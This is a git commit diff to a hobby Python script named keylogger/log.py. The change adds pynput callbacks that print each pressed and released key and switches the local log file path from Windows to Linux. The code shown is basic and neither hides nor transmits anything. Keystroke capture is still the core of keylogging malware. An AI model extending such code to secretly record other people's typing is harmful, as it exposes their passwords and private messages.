639009bee5a3fa39ee749e39a37fac03e8221acf
joey101 <jawad.tanana@gmail.com>
2021-05-27 16:16:27 +1000

    idk

--- keylogger/log.py
+++ keylogger/log.py
@@ -5,15 +5,36 @@
 
 """
 
-import keyboard as key
+from pynput import keyboard
 import numpy as np
 from datetime import datetime as t
 
+# Listens to the key inputs from the keyboard
+def on_press(key):
+    try:
+        print('alphanumeric key {0} pressed'.format(
+            key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(
+            key))
+        #  
+def on_release(key):
+    print('{0} released'.format(
+        key))
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+    
+
+
+
+
+
 
 # For Linux Directory
-#with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as logging:
+with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as logging:
 # For Windows Directory
-with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as logging:
+#with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as logging:
     # This gets the date and time in 
     # dd/mm/yyyy and HH:MM:SS
     now = t.now()
